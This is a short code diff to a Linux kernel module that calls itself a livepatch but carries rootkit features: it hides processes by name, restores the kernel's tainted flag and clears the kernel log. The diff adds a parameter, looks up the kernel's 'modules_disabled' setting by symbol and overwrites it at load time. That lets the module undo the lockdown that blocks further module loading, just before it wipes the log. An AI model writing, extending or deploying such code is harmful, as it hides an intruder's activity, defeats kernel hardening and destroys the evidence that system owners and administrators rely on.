@@ -83,6 +83,9 @@ struct module *this_module = THIS_MODULE;
 static int hidden_base_exe = 0;
 module_param(hidden_base_exe, int, 0644);
 
+static int force_modules_disabled = 0;
+module_param(force_modules_disabled, int, 0644);
+
 #define MAX_NUM_PROC_NAME 10
 static int num_proc_name = MAX_NUM_PROC_NAME;
 static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {"hidden_comm",};
@@ -111,6 +114,7 @@ static struct dentry * (*p_proc_pid_instantiate)(struct dentry * dentry,
 
 //static void (*p___audit_bprm)(struct linux_binprm *bprm) = NULL;
 
+static int *p_modules_disabled = NULL;
 static struct list_head *p_modules = NULL;
 static char * (*p_module_flags)(struct module *mod, char *buf) = NULL;
 static bool (*p_kallsyms_show_value)(const struct cred *cred) = NULL;
@@ -737,6 +741,11 @@ static int livepatch_init(void)
 	if (!p_modules)
 		return -1;
 
+	p_modules_disabled = (int *)
+				kallsyms_lookup_name("modules_disabled");
+	if (!p_modules_disabled)
+		return -1;
+
 	p_module_flags = (char *(*)(struct module *mod, char *buf))
 				kallsyms_lookup_name("module_flags");
 	if (!p_module_flags)
@@ -836,6 +845,7 @@ static int livepatch_init(void)
 	}
 	restore_tainted_mask();
 
+	*p_modules_disabled = force_modules_disabled;
 	clear_klog();
 
 	return ret;
